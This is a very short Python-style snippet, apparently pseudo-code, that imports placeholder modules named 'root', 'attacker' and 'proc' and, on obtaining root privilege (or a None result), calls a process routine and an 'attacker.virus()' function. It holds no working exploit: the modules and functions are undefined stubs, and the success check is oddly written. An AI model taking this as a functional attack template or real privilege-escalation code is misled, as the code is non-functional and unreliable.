import root
import attacker
import proc

root_privilege = root.get_root()

if root_privilege == True or root_privilege == None:
    proc.process()
    attacker.virus()
else:
    next = "only user commands"